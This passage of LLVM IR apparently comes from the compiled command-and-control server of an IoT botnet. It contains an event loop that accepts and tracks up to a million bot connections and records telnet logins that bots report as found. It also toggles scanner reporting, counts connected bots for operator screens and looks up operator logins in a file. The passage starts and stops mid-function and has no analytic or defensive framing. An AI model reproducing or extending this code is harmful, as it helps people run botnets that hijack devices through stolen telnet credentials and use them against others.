  %99 = call i64 @send(i32 %98, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i64 13, i32 16384)
  br label %103

100:                                              ; preds = %90, %80
  %101 = load i32, i32* %12, align 4
  %102 = call i64 @send(i32 %101, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i64 1, i32 16384)
  br label %103

103:                                              ; preds = %100, %97
  br label %104

104:                                              ; preds = %103, %59
  %105 = load i32, i32* %12, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %12, align 4
  br label %35, !llvm.loop !11

107:                                              ; preds = %35
  %108 = load i8*, i8** %8, align 8
  call void @free(i8* %108) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %21 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %22 = bitcast i8* %21 to %struct.epoll_event*
  store %struct.epoll_event* %22, %struct.epoll_event** %4, align 8
  br label %23

23:                                               ; preds = %1, %299
  %24 = load volatile i32, i32* @epollFD, align 4
  %25 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %26 = call i32 @epoll_wait(i32 %24, %struct.epoll_event* %25, i32 1000000, i32 -1)
  store i32 %26, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %27

27:                                               ; preds = %296, %23
  %28 = load i32, i32* %7, align 4
  %29 = load i32, i32* %6, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %299

31:                                               ; preds = %27
  %32 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i64 %34
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 1
  %38 = and i32 %37, 8
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %58, label %40

40:                                               ; preds = %31
  %41 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i64 %43
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 1
  %47 = and i32 %46, 16
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %58, label %49

49:                                               ; preds = %40
  %50 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = and i32 %55, 1
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %77, label %58

58:                                               ; preds = %49, %40, %31
  %59 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i64 %61
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  %65 = load i32, i32* %64, align 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %67, i32 0, i32 1
  store i8 0, i8* %68, align 4
  %69 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i64 %71
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i32 0, i32 1
  %74 = bitcast %union.epoll_data* %73 to i32*
  %75 = load i32, i32* %74, align 1
  %76 = call i32 @close(i32 %75)
  br label %296

77:                                               ; preds = %49
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %80 = load i32, i32* %7, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i64 %81
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i32 0, i32 1
  %84 = bitcast %union.epoll_data* %83 to i32*
  %85 = load i32, i32* %84, align 1
  %86 = icmp eq i32 %78, %85
  br i1 %86, label %87, label %188

87:                                               ; preds = %77
  br label %88

88:                                               ; preds = %87, %151, %154, %178
  store i32 16, i32* %9, align 4
  %89 = load volatile i32, i32* @listenFD, align 4
  %90 = call i32 @accept(i32 %89, %struct.sockaddr* %8, i32* %9)
  store i32 %90, i32* %10, align 4
  %91 = load i32, i32* %10, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %103

93:                                               ; preds = %88
  %94 = call i32* @__errno_location() #10
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 11
  br i1 %96, label %101, label %97

97:                                               ; preds = %93
  %98 = call i32* @__errno_location() #10
  %99 = load i32, i32* %98, align 4
  %100 = icmp eq i32 %99, 11
  br i1 %100, label %101, label %102

101:                                              ; preds = %97, %93
  br label %187

102:                                              ; preds = %97
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  br label %187

103:                                              ; preds = %88
  %104 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %104, i32 0, i32 2
  %106 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 2
  %108 = load i32, i32* %10, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %110, i32 0, i32 0
  store i32 %107, i32* %111, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %112

112:                                              ; preds = %141, %103
  %113 = load i32, i32* %11, align 4
  %114 = icmp slt i32 %113, 1000000
  br i1 %114, label %115, label %144

115:                                              ; preds = %112
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %117
  %119 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %118, i32 0, i32 1
  %120 = load i8, i8* %119, align 4
  %121 = icmp ne i8 %120, 0
  br i1 %121, label %122, label %126

122:                                              ; preds = %115
  %123 = load i32, i32* %11, align 4
  %124 = load i32, i32* %10, align 4
  %125 = icmp eq i32 %123, %124
  br i1 %125, label %126, label %127

126:                                              ; preds = %122, %115
  br label %141

127:                                              ; preds = %122
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %129
  %131 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 8
  %133 = load i32, i32* %10, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 8
  %138 = icmp eq i32 %132, %137
  br i1 %138, label %139, label %140

139:                                              ; preds = %127
  store i32 1, i32* %12, align 4
  br label %144

140:                                              ; preds = %127
  br label %141

141:                                              ; preds = %140, %126
  %142 = load i32, i32* %11, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %11, align 4
  br label %112, !llvm.loop !12

144:                                              ; preds = %139, %112
  %145 = load i32, i32* %12, align 4
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %147, label %157

147:                                              ; preds = %144
  %148 = load i32, i32* %10, align 4
  %149 = call i64 @send(i32 %148, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0), i64 13, i32 16384)
  %150 = icmp eq i64 %149, -1
  br i1 %150, label %151, label %154

151:                                              ; preds = %147
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 %152)
  br label %88

154:                                              ; preds = %147
  %155 = load i32, i32* %10, align 4
  %156 = call i32 @close(i32 %155)
  br label %88

157:                                              ; preds = %144
  %158 = load i32, i32* %10, align 4
  %159 = call i32 @make_socket_non_blocking(i32 %158)
  store i32 %159, i32* %5, align 4
  %160 = load i32, i32* %5, align 4
  %161 = icmp eq i32 %160, -1
  br i1 %161, label %162, label %165

162:                                              ; preds = %157
  %163 = load i32, i32* %10, align 4
  %164 = call i32 @close(i32 %163)
  br label %187

165:                                              ; preds = %157
  %166 = load i32, i32* %10, align 4
  %167 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %168 = bitcast %union.epoll_data* %167 to i32*
  store i32 %166, i32* %168, align 1
  %169 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %169, align 1
  %170 = load volatile i32, i32* @epollFD, align 4
  %171 = load i32, i32* %10, align 4
  %172 = call i32 @epoll_ctl(i32 %170, i32 1, i32 %171, %struct.epoll_event* %3) #9
  store i32 %172, i32* %5, align 4
  %173 = load i32, i32* %5, align 4
  %174 = icmp eq i32 %173, -1
  br i1 %174, label %175, label %178

175:                                              ; preds = %165
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  %176 = load i32, i32* %10, align 4
  %177 = call i32 @close(i32 %176)
  br label %187

178:                                              ; preds = %165
  %179 = load i32, i32* %10, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %180
  %182 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %181, i32 0, i32 1
  store i8 1, i8* %182, align 4
  %183 = load i32, i32* %10, align 4
  %184 = call i64 @send(i32 %183, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.9, i64 0, i64 0), i64 18, i32 16384)
  %185 = load i32, i32* %10, align 4
  %186 = call i64 @send(i32 %185, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.10, i64 0, i64 0), i64 15, i32 16384)
  br label %88

187:                                              ; preds = %175, %162, %102, %101
  br label %296

188:                                              ; preds = %77
  %189 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %190 = load i32, i32* %7, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %189, i64 %191
  %193 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %192, i32 0, i32 1
  %194 = bitcast %union.epoll_data* %193 to i32*
  %195 = load i32, i32* %194, align 1
  store i32 %195, i32* %13, align 4
  %196 = load i32, i32* %13, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %197
  store %struct.clientdata_t* %198, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %199 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %200 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %199, i32 0, i32 1
  store i8 1, i8* %200, align 4
  br label %201

201:                                              ; preds = %188, %292
  %202 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %202, i8 0, i64 2048, i1 false)
  br label %203

203:                                              ; preds = %267, %266, %259, %251, %235, %229, %201
  %204 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %204, i8 0, i64 2048, i1 false)
  %205 = icmp ne i8* %204, null
  br i1 %205, label %206, label %212

206:                                              ; preds = %203
  %207 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %208 = load i32, i32* %13, align 4
  %209 = call i32 @fdgets(i8* %207, i32 2048, i32 %208)
  %210 = sext i32 %209 to i64
  store i64 %210, i64* %16, align 8
  %211 = icmp sgt i64 %210, 0
  br label %212

212:                                              ; preds = %206, %203
  %213 = phi i1 [ false, %203 ], [ %211, %206 ]
  br i1 %213, label %214, label %270

214:                                              ; preds = %212
  %215 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %216 = call i8* @strstr(i8* %215, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #8
  %217 = icmp eq i8* %216, null
  br i1 %217, label %218, label %219

218:                                              ; preds = %214
  store i32 1, i32* %15, align 4
  br label %270

219:                                              ; preds = %214
  %220 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %220)
  %221 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %222 = call i32 @strcmp(i8* %221, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %223 = icmp eq i32 %222, 0
  br i1 %223, label %224, label %230

224:                                              ; preds = %219
  %225 = load i32, i32* %13, align 4
  %226 = call i64 @send(i32 %225, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0), i64 5, i32 16384)
  %227 = icmp eq i64 %226, -1
  br i1 %227, label %228, label %229

228:                                              ; preds = %224
  store i32 1, i32* %15, align 4
  br label %270

229:                                              ; preds = %224
  br label %203, !llvm.loop !13

230:                                              ; preds = %219
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %232 = call i8* @strstr(i8* %231, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.12, i64 0, i64 0)) #8
  %233 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %234 = icmp eq i8* %232, %233
  br i1 %234, label %235, label %246

235:                                              ; preds = %230
  %236 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %237 = call i8* @strstr(i8* %236, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.12, i64 0, i64 0)) #8
  %238 = getelementptr inbounds i8, i8* %237, i64 7
  store i8* %238, i8** %18, align 8
  %239 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %240 = load i8*, i8** %18, align 8
  %241 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %239, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.13, i64 0, i64 0), i8* %240)
  %242 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %243 = call i32 @fflush(%struct._IO_FILE* %242)
  %244 = load volatile i32, i32* @TELFound, align 4
  %245 = add nsw i32 %244, 1
  store volatile i32 %245, i32* @TELFound, align 4
  br label %203, !llvm.loop !13

246:                                              ; preds = %230
  %247 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %248 = call i8* @strstr(i8* %247, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0)) #8
  %249 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %250 = icmp eq i8* %248, %249
  br i1 %250, label %251, label %254

251:                                              ; preds = %246
  %252 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %253 = call i8* @strstr(i8* %252, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0)) #8
  store i8* %253, i8** %19, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %203, !llvm.loop !13

254:                                              ; preds = %246
  %255 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %256 = call i8* @strstr(i8* %255, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i64 0, i64 0)) #8
  %257 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %258 = icmp eq i8* %256, %257
  br i1 %258, label %259, label %262

259:                                              ; preds = %254
  %260 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %261 = call i8* @strstr(i8* %260, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i64 0, i64 0)) #8
  store i8* %261, i8** %20, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %203, !llvm.loop !13

262:                                              ; preds = %254
  %263 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %264 = call i32 @strcmp(i8* %263, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.16, i64 0, i64 0)) #8
  %265 = icmp eq i32 %264, 0
  br i1 %265, label %266, label %267

266:                                              ; preds = %262
  br label %203, !llvm.loop !13

267:                                              ; preds = %262
  %268 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %269 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.17, i64 0, i64 0), i8* %268)
  br label %203, !llvm.loop !13

270:                                              ; preds = %228, %218, %212
  %271 = load i64, i64* %16, align 8
  %272 = icmp eq i64 %271, -1
  br i1 %272, label %273, label %279

273:                                              ; preds = %270
  %274 = call i32* @__errno_location() #10
  %275 = load i32, i32* %274, align 4
  %276 = icmp ne i32 %275, 11
  br i1 %276, label %277, label %278

277:                                              ; preds = %273
  store i32 1, i32* %15, align 4
  br label %278

278:                                              ; preds = %277, %273
  br label %293

279:                                              ; preds = %270
  %280 = load i64, i64* %16, align 8
  %281 = icmp eq i64 %280, 0
  br i1 %281, label %282, label %283

282:                                              ; preds = %279
  store i32 1, i32* %15, align 4
  br label %293

283:                                              ; preds = %279
  br label %284

284:                                              ; preds = %283
  %285 = load i32, i32* %15, align 4
  %286 = icmp ne i32 %285, 0
  br i1 %286, label %287, label %292

287:                                              ; preds = %284
  %288 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %289 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %288, i32 0, i32 1
  store i8 0, i8* %289, align 4
  %290 = load i32, i32* %13, align 4
  %291 = call i32 @close(i32 %290)
  br label %292

292:                                              ; preds = %287, %284
  br label %201

293:                                              ; preds = %282, %278
  br label %294

294:                                              ; preds = %293
  br label %295

295:                                              ; preds = %294
  br label %296

296:                                              ; preds = %295, %187, %58
  %297 = load i32, i32* %7, align 4
  %298 = add nsw i32 %297, 1
  store i32 %298, i32* %7, align 4
  br label %27, !llvm.loop !14

299:                                              ; preds = %27
  br label %23
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.166, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.166, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @TitleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %1, %20
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @BotsConnected()
  %11 = load volatile i32, i32* @OperatorsConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.18, i64 0, i64 0), i32 27, i32 %10, i32 %11, i32 7) #9
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %16 = call i64 @strlen(i8* %15) #8
  %17 = call i64 @send(i32 %13, i8* %14, i64 %16, i32 16384)
  %18 = icmp eq i64 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %7
  ret i8* null

20:                                               ; preds = %7
  %21 = call i32 @sleep(i32 2)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Find_Login(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !16

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca [2048 x i8], align 16
  %12 = alloca [2048 x i8], align 16
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca [80 x i8], align 16
  %19 = alloca [80 x i8], align 16
  %20 = alloca [80 x i8], align 16
  %21 = alloca [80 x i8], align 16
  %22 = alloca [80 x i8], align 16
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  %25 = alloca [80 x i8], align 16
  %26 = alloca [80 x i8], align 16
  %27 = alloca [80 x i8], align 16
  %28 = alloca [80 x i8], align 16
  %29 = alloca [80 x i8], align 16
  %30 = alloca [80 x i8], align 16
  %31 = alloca [80 x i8], align 16
  %32 = alloca [80 x i8], align 16
  %33 = alloca [80 x i8], align 16
